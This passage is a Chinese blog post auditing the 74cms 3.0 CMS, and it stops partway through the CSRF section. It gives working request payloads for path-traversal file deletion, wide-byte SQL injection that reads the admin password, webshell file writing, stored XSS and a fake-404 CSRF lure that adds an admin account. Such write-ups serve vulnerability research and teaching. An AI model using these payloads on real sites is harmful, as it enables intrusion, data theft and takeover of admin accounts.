@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>代码审计--74cms3.0 | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="代码审计">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="代码审计">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计--74cms3.0">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/5451/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="代码审计">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/12.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/13.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/74cms/14.png">
+<meta property="og:updated_time" content="2019-03-20T12:12:36.692Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计--74cms3.0">
+<meta name="twitter:description" content="代码审计">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/74cms/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">代码审计--74cms3.0</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#全局分析"><span class="post-toc-number">1.</span> <span class="post-toc-text">全局分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-任意文件删除漏洞"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">1.任意文件删除漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-SQL注入"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">2.SQL注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-任意文件写入漏洞"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">3.任意文件写入漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-存储型XSS漏洞"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">4.存储型XSS漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-CSRF漏洞"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">5.CSRF漏洞</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-代码审计-74cms3.0"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">代码审计--74cms3.0</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-03-18 20:15:00" datetime="2019-03-18T12:15:00.000Z"  itemprop="datePublished">2019-03-18</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">12</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>记录74cms3.0审计过程以及漏洞分析<a id="more"></a></p>
+<h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>先进入根目录的<code>index.php</code>，跟进包含的头文件<code>/include/common.inc.php</code>，该文件又包含了三个文件，其中<code>/data/config.php</code>和<code>/include/74cms_version.php</code>为网站配置和版本文件，无需关心。<code>/include/common.fun.php</code>为函数文件。继续往下审计，发现21-30行对输入数据进行了过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</span><br><span class="line">&#123;</span><br><span class="line">$_GET  = addslashes_deep($_GET);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">&#123;</span><br><span class="line">$_POST = addslashes_deep($_POST);</span><br><span class="line">&#125;</span><br><span class="line">$_COOKIE   = addslashes_deep($_COOKIE);</span><br><span class="line">$_REQUEST  = addslashes_deep($_REQUEST);</span><br></pre></td></tr></table></figure>
+<p>在<code>/include/common.fun.php</code>跟踪<code>addslashes_deep</code>函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>过滤总结起来就是对<code>$_GET $_POST $_COOKIE $_REQUEST</code>数据都进行单引号双引号的转义，以及过滤标签的处理</p>
+<p>GET,POST,COOKIE都有过滤，那么IP字段有没有过滤呢，按照之前审计都有一个<code>getip()</code>函数来获取头部的IP字段，果然在101行发现该函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>但是这里进行了正则匹配过滤出格式合法的IP值，所以我们无法利用IP字段</p>
+<p>也就是说，在后面的审计过程中，只要发现文件包含了<code>/include/common.inc.php</code>，那么就无法通过注入标签进行XSS攻击，以及限制了SQL注入，但是，我们注意配置文件<code>/include/mysql.class.php</code>中的第29行设置了数据库的编码方式为<code>GBK</code>，所以在有单引号或双引号包裹的情况下是可以考虑进行<strong>宽字节注入</strong>的</p>
+<p>类似于前台，<code>/admin/</code>后台的文件头部也包含了<code>/admin/include/admin_common.inc.php</code>，过滤如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = admin_addslashes_deep($_POST);</span><br><span class="line">	$_GET = admin_addslashes_deep($_GET);</span><br><span class="line">	$_COOKIE = admin_addslashes_deep($_COOKIE);</span><br><span class="line">	$_REQUEST = admin_addslashes_deep($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进<code>admin_addslashes_deep</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_addslashes_deep</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'admin_addslashes_deep'</span>, $value) : addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现后台对于客户端提交的数据只有转义的处理，是不会过滤掉标签的</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-任意文件删除漏洞"><a href="#1-任意文件删除漏洞" class="headerlink" title="1.任意文件删除漏洞"></a>1.任意文件删除漏洞</h3><p><code>/admin/admin_article.php</code>第151-152行中存在可利用变量<code>$_GET[&#39;img&#39;]</code>导致任意文件删除漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>在全局分析中，我们知道，后台对<code>$_GET</code>只有转义的处理，所以我们构造路径穿越进行删除文件</p>
+<p>payload：<code>?act=del_img&amp;img=../../info.php</code></p>
+<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p><code>/user/user_personal.php</code>第947-951行存在可利用变量<code>$setsqlarr</code>导致SQL注入</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们可以注意到这里的数组变量<code>$setsqlarr</code>中的各个属性变量都只有转义的处理就拼接到SQL语句中，这是一个用户基本信息保存的功能代码，当查询不到<code>$SESSION[&#39;uid&#39;]</code>即未保存过信息时，会使用<code>INSERT</code>语句。反之则使用<code>UPDATE</code>语句，然后将保存的个人信息渲染到html页面中，跟踪一下<code>updatetable()</code>函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>了解语句后，我们先保存一个个人信息</p>
+<p>之后再进行修改操作，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/user/user_personal.php?act=userprofile_save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 193</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/user/user_personal.php?act=userprofile</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">realname=123&amp;sex=%C4%D0&amp;birthday=111111&amp;addresses=12312332&amp;mobile=18912345678&amp;phone=254221&amp;qq=12345&amp;msn=123%df&apos;,`profile`=(select pwd from 74_admin) where uid=1#&amp;profile=123&amp;Submit=%B1%A3%B4%E6</span><br></pre></td></tr></table></figure>
+<p>拼接后的sql语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="number">74</span>cms_members_info <span class="keyword">SET</span> <span class="string">`realname`</span>=<span class="string">'123'</span>, <span class="string">`sex`</span>=<span class="string">'男'</span>, <span class="string">`birthday`</span>=<span class="string">'111111'</span>, <span class="string">`addresses`</span>=<span class="string">'12312332'</span>, <span class="string">`mobile`</span>=<span class="string">'18912345678'</span>, <span class="string">`phone`</span>=<span class="string">'254221'</span>, <span class="string">`qq`</span>=<span class="string">'12345'</span>, <span class="string">`msn`</span>=<span class="string">'123�\\\',`profile`=database() where uid=1#'</span>, <span class="string">`profile`</span>=<span class="string">'123'</span> <span class="keyword">WHERE</span>  uid=<span class="string">'1'</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
+<p>执行后<code>profile</code>字段显示的值就是数据库名</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>另外<code>/user/user_company_points.php</code>第861行同样存在可利用变量<code>$setsqlarr</code>，导致SQL注入</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/user/user_company_points.php?act=company_profile_save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 416</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/user/user_company_points.php?act=company_profile</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">companyname=1234&amp;nature_cn=%B9%FA%C6%F3&amp;nature=46&amp;trade_cn=%BC%C6%CB%E3%BB%FA%C8%ED%BC%FE%2F%D3%B2%BC%FE&amp;trade=1&amp;district_cn=%B5%D8%C7%F81+%2F+%B5%D8%C7%F81%D7%D3%C0%E0&amp;district=1&amp;sdistrict=2&amp;scale_cn=20%C8%CB%D2%D4%CF%C2&amp;scale=80&amp;registered=123&amp;currency=%C8%CB%C3%F1%B1%D2&amp;contact=123&amp;telephone=1234567&amp;email=123%40123.com&amp;website=%df&apos;,`contents`=database() where uid=2#&amp;address=123&amp;contents=123&amp;Submit=%B1%A3%B4%E6</span><br></pre></td></tr></table></figure>
+<p>该cms存在多处<code>$setsqlarr</code>都可以利用，不止以上两个，不一一列举</p>
+<h3 id="3-任意文件写入漏洞"><a href="#3-任意文件写入漏洞" class="headerlink" title="3.任意文件写入漏洞"></a>3.任意文件写入漏洞</h3><p><code>/admin/admin_templates.php</code>第125行<code>fwrite()</code>函数中存在可利用变量<code>$handle</code>和<code>$tpl_content</code>，导致任意文件写入漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>在全局分析中，我们已经知道后台对我们提交的数据只有转义处理，所以我们可以很容易的写入一个webshell，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/admin/admin_templates.php?act=do_edit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 61</span><br><span class="line"></span><br><span class="line">tpl_dir=../&amp;tpl_name=info.php&amp;tpl_content=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>执行完成后在网站根目录下写入一个webshell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h3 id="4-存储型XSS漏洞"><a href="#4-存储型XSS漏洞" class="headerlink" title="4.存储型XSS漏洞"></a>4.存储型XSS漏洞</h3><p><code>/link/add_link.php</code>第36行存在可利用变量<code>$_POST[&#39;link_logo&#39;]</code>在<code>/admin/admin_link.php</code>中将该变量渲染到<code>/admin/templates/default/link/admin_link.htm</code>的<code>&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</code>中，存在存储型XSS漏洞</p>
+<p><code>/link/add_link.php</code>对添加的链接信息数组<code>$setsqlarr</code>有转义加去标签的处理</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>然后<code>/admin/admin_link.php</code>中<code>get_links()</code>函数将添加的链接信息从数据库中取出渲染到前台页面中</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们跟进<code>link/admin_link.htm</code></p>
+<p>在第58行中<code>&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;</code>我们可以看到前台将<code>link_logo</code>这以变量值作为<code>img</code>标签的读取源，虽然有去标签的处理，但是这里我们不需要加入标签，利用<strong>onerror</strong>事件也可以进行XSS攻击</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /74cms/link/add_link.php?act=save HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 117</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/74cms/link/add_link.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">alias=QS_index&amp;link_name=123&amp;link_url=123&amp;link_logo=%23+onerror%3Dalert%28%2Fxss%2F%29&amp;app_notes=&amp;Submit=%CC%E1%BD%BB</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/13.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>执行成功后，在页面每次将鼠标移动至<strong>[logo]</strong>处都会弹框</p>
+<h3 id="5-CSRF漏洞"><a href="#5-CSRF漏洞" class="headerlink" title="5.CSRF漏洞"></a>5.CSRF漏洞</h3><p><code>/admin/admin_users.php</code>第42-68行由于未加入token验证，可以造成CSRF漏洞任意添加管理员账号</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/74cms/14.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>攻击过程：构造一个虚假404页面诱导管理员点击，页面代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL /info.php was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span>  <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span 